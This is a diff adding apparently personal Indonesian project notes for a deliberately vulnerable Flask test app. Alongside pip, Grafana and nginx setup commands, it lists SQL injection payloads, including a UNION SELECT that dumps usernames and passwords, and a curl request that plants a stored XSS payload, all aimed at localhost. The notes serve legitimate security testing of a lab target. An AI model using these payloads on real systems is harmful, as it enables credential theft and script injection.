@@ -1,0 +1,54 @@
+- jika mengalami masalah berikut saat uji postman khususnya yang sqli "message": "The method is not allowed for the requested URL."
+  kemungkinan menggunakan method yang salah, sepertinya yang harusnya post malah get
+
+jika error ketika memperbarui database berupa
+(venv) C:\Users\fikri\OneDrive\Dokumen\TA\Implement\DFVA-FH\database>python init_db.py        
+Traceback (most recent call last):
+  File "C:\Users\fikri\OneDrive\Dokumen\TA\Implement\DFVA-FH\database\init_db.py", line 1, in <module>
+    from app import create_app, db
+ModuleNotFoundError: No module named 'app'
+===solusi===
+ubah command jadi = python -m database.init_db
+
+SQL Injection
+http://127.0.0.1:5000/users/search post
+Melihat semua user
+{ "search_term": "' OR '1'='1" }
+
+UNION lihat password
+{ "search_term": "' UNION SELECT id, username, password FROM user -- " }
+
+XSS
+dibash
+curl -X PUT -H "Content-Type: application/json" \
+     -d '{"description": "Halo! <img src=x onerror=alert(\"Stored_XSS_for_User_1!\")>"}' \
+     http://127.0.0.1:5000/users/1/description
+# Hasil: Harusnya {"message": "Deskripsi untuk user user1 berhasil diupdate."}
+
+update requirements
+pip list --outdated --format=freeze akan membuat daftar paket yang versinya sudah lama.
+pip install -U -r outdated.txt akan memperbarui semuanya ke versi terbaru.
+pip freeze (untuk melihat semua library dan dependencies)
+pip freeze > requirements.txt (menyimpan semua library dan dependencies)
+pipreqs . --force (yang dipakai di proyek saja + simpen ke requirements.txt)
+
+
+configurasi 
+
+micro grafana.ini
+
+##copy
+docker cp grafana.ini grafana:/etc/grafana/grafana.ini
+
+docker exec -it grafana /bin/bash
+
+vi /etc/grafana/grafana.ini
+
+exit
+exit
+
+sudo micro /etc/nginx/sites-available/fh.polban.studio
+
+docker restart grafana
+
+sudo systemctl restart nginx
